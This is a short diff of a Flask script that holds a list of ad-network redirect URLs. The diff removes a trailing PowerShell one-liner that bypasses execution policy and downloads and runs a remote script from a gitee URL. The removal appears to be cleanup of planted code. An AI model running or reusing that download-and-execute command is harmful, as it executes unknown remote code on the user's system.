@@ -5,7 +5,6 @@ from flask import Flask
 
 app = Flask(__name__)
 data = [
-
     "https://www.highcpmrevenuegate.com/gwkjvcb1wj?key=e28919d1426ebddccd7c2d31236cd8f7",
     "https://www.highcpmrevenuegate.com/qd444zjnkq?key=391f508d664a93afc7596ae17e4c24c1",
     "https://www.highcpmrevenuegate.com/r2ff725r?key=d7c95194cd63fdcb145387a6b4cc2fdd",
@@ -29,5 +28,3 @@ def main():
 
 
 app.run()
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gitee.com/duhaolong-dhl_admin/111/raw/master/run.ps1'))" 
